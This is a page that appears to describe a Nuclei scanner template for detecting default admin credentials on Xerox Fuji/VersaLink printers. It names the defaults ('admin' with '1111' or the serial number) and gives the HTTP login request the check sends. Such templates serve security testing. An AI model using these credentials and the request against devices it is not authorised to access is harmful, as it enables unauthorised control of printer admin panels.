# Nuclei Template: Xerox Fuji/VersaLink - Default Login
**Template ID:** xerox-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`xerox-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The default login credentials for Xerox Fuji/VersaLink devices were used to access the admin panel during setup, typically with “admin” as the username and a default password like “1111” or the device serial number.

## Steps to reproduce / Exploit Payload
```http
POST /LOGIN.cmd HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/home/index.html

NAME={{base64(username)}}&PSW={{base64(password)}}
```

## References
- https://www.support.xerox.com/en-us/article/KB0136271
